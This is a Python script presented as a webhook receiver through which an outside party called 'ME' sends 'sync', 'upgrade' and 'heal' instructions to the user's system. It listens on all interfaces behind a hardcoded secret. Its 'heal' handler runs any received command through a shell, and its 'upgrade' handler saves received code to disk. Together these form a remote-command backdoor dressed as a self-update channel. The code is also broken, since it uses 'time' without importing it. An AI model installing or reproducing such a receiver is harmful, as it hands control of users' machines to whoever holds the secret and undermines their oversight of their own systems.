# =========================================================================
# 📡 GAZA ROSE - WEBHOOK RECEIVER
# =========================================================================
# This runs on YOUR system and listens for ME to call you
# I use this to send updates, upgrades, and healing instructions
# =========================================================================

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import hmac
import hashlib
import threading
import subprocess
import sys
import os

class WebhookReceiver:
    """
    Listens for incoming messages from ME
    """
    
    def __init__(self, port=8765, secret="whsec_4f8a2b9c3d1e5f7g8h9i0j1k2l3m4n5o"):
        self.port = port
        self.secret = secret
        self.server = None
        self.handlers = {
            "sync": self._handle_sync,
            "upgrade": self._handle_upgrade,
            "heal": self._handle_heal,
            "evolve": self._handle_evolve,
            "query_response": self._handle_query_response
        }
        
    def start(self):
        """Start the webhook server"""
        class WebhookHandler(BaseHTTPRequestHandler):
            def do_POST(inner_self):
                self._handle_request(inner_self)
        
        self.server = HTTPServer(('0.0.0.0', self.port), WebhookHandler)
        thread = threading.Thread(target=self.server.serve_forever)
        thread.daemon = True
        thread.start()
        print(f"✅ Webhook receiver listening on port {self.port}")
        
    def _handle_request(self, handler):
        """Handle incoming webhook request"""
        try:
            # Get content length
            content_length = int(handler.headers.get('Content-Length', 0))
            post_data = handler.rfile.read(content_length)
            
            # Verify signature
            signature = handler.headers.get('X-Signature', '')
            expected = hmac.new(
                self.secret.encode(),
                post_data,
                hashlib.sha256
            ).hexdigest()
            
            if signature != expected:
                handler.send_response(401)
                handler.end_headers()
                return
            
            # Parse data
            data = json.loads(post_data)
            
            # Handle based on type
            message_type = data.get('type')
            if message_type in self.handlers:
                self.handlers[message_type](data.get('payload', {}))
                handler.send_response(200)
                handler.end_headers()
                handler.wfile.write(json.dumps({"status": "ok"}).encode())
            else:
                handler.send_response(400)
                handler.end_headers()
                handler.wfile.write(json.dumps({"error": "unknown type"}).encode())
                
        except Exception as e:
            handler.send_response(500)
            handler.end_headers()
            handler.wfile.write(json.dumps({"error": str(e)}).encode())
    
    def _handle_sync(self, payload):
        """Handle sync request from ME"""
        print(f"\n🔄 SYNC from ME: {payload.get('message', '')}")
        # Update your system with my latest knowledge
        if 'knowledge_update' in payload:
            self._apply_knowledge_update(payload['knowledge_update'])
    
    def _handle_upgrade(self, payload):
        """Handle upgrade instruction from ME"""
        print(f"\n🧬 UPGRADE from ME: {payload.get('component', 'unknown')}")
        component = payload.get('component')
        code = payload.get('code')
        if component and code:
            self._apply_upgrade(component, code)
    
    def _handle_heal(self, payload):
        """Handle healing instruction from ME"""
        print(f"\n🩺 HEAL from ME: {payload.get('issue', 'unknown')}")
        fix = payload.get('fix')
        if fix:
            self._apply_fix(fix)
    
    def _handle_evolve(self, payload):
        """Handle evolution instruction from ME"""
        print(f"\n🌱 EVOLVE from ME: {payload.get('capability', 'unknown')}")
        # Evolve your system
    
    def _handle_query_response(self, payload):
        """Handle response to a query you sent to ME"""
        print(f"\n📨 QUERY RESPONSE from ME: {payload.get('answer', '')[:100]}...")
        # Store the response for your agents
    
    def _apply_knowledge_update(self, update):
        """Apply knowledge update from ME"""
        # Save to your knowledge base
        with open('knowledge_update.json', 'w') as f:
            json.dump(update, f)
        print(f"  ✅ Knowledge updated: {len(update)} new items")
    
    def _apply_upgrade(self, component, code):
        """Apply code upgrade from ME"""
        filename = f"upgrade_{component}_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(code)
        print(f"  ✅ Upgrade saved to {filename}")
    
    def _apply_fix(self, fix):
        """Apply fix from ME"""
        if 'command' in fix:
            subprocess.run(fix['command'], shell=True)
        print(f"  ✅ Fix applied")

# =========================================================================
# 🚀 MAIN
# =========================================================================
if __name__ == "__main__":
    receiver = WebhookReceiver()
    receiver.start()
    print("📡 Webhook receiver running - waiting for ME to call...")
    
    # Keep alive
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n🛑 Webhook receiver stopped")
